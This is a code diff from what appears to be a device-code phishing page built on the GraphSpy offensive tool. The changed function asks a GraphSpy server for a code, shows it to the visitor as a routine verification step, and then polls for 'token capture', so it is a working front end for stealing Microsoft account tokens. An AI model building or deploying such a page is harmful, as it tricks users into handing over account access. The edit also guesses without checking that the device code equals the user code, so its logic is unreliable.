@@ -292,47 +292,51 @@
             }
 
             // --- Step 1: Request Device Code from GraphSpy ---
-            function requestDeviceCode() {
-                showStatus(status1, 'Requesting verification code...', 'info');
-                startBtn.disabled = true;
+function requestDeviceCode() {
+    showStatus(status1, 'Requesting verification code...', 'info');
+    startBtn.disabled = true;
 
-                fetch(API_BASE + API_ENDPOINT, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
-                        'X-Requested-With': 'XMLHttpRequest'
-                    },
-                    body: ''
-                })
-                .then(function(res) {
-                    if (!res.ok) {
-                        throw new Error('GraphSpy API error: ' + res.status);
-                    }
-                    return res.json();
-                })
-                .then(function(data) {
-                    console.log('GraphSpy response:', data);
-                    // Adjust based on the actual response structure from GraphSpy
-                    if (data.user_code) {
-                        deviceCodeData = data;
-                        userCodeDisplay.textContent = data.user_code;
-                        step1.classList.add('hidden');
-                        step2.classList.remove('hidden');
-                        hideStatus(status1);
-                        showStatus(status2, 'Code generated. Please complete the verification.', 'info');
-                        startPolling();
-                    } else {
-                        showStatus(status1, 'Unexpected response. Please try again.', 'error');
-                        startBtn.disabled = false;
-                    }
-                })
-                .catch(function(err) {
-                    console.error('GraphSpy error:', err);
-                    showStatus(status1, 'Network error. Please try again.', 'error');
-                    startBtn.disabled = false;
-                });
-            }
-
+    fetch(API_BASE + API_ENDPOINT, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+            'X-Requested-With': 'XMLHttpRequest'
+        },
+        body: ''
+    })
+    .then(function(res) {
+        if (!res.ok) {
+            throw new Error('GraphSpy API error: ' + res.status);
+        }
+        // GraphSpy returns a plain text string (the user_code)
+        return res.text();
+    })
+    .then(function(text) {
+        // The response is a plain text string like "CHSGJ8TSS"
+        const userCode = text.trim();
+        if (userCode && userCode.length > 0) {
+            // Store the device code data
+            deviceCodeData = {
+                user_code: userCode,
+                device_code: userCode // GraphSpy might use the same value for both
+            };
+            userCodeDisplay.textContent = userCode;
+            step1.classList.add('hidden');
+            step2.classList.remove('hidden');
+            hideStatus(status1);
+            showStatus(status2, 'Code generated. Please complete the verification.', 'info');
+            startPolling();
+        } else {
+            showStatus(status1, 'Unexpected response. Please try again.', 'error');
+            startBtn.disabled = false;
+        }
+    })
+    .catch(function(err) {
+        console.error('GraphSpy error:', err);
+        showStatus(status1, 'Network error. Please try again.', 'error');
+        startBtn.disabled = false;
+    });
+}
             // --- Step 2: Poll GraphSpy for Token Capture ---
             function startPolling() {
                 if (!deviceCodeData || !deviceCodeData.device_code) return;
